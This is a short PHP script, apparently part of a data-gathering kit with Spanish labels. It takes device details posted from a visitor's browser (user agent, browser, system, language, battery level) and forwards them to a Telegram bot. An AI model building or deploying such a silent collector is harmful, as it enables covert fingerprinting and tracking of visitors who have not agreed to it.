<?php
require_once __DIR__ . '/telegram.php';

$user_agent = $_POST['agent'] ?? 'N/A';
$navigator  = $_POST['navegador'] ?? 'N/A';
$versionapp = $_POST['versionapp'] ?? 'N/A';
$distro     = $_POST['distro'] ?? 'N/A';
$lenguaje   = $_POST['idioma'] ?? 'N/A';
$bateria    = $_POST['bateria'] ?? 'N/A';

$msg = "📊 <b>Datos del dispositivo</b>\n".
       "🖥 User-Agent: $user_agent\n".
       "🌐 Navegador: $navigator\n".
       "🔢 Versión: $versionapp\n".
       "💻 Sistema: $distro\n".
       "🗣 Idioma: $lenguaje\n".
       "🔋 Batería: $bateria%";

send_to_telegram($msg);

echo json_encode(['status' => 'ok']);
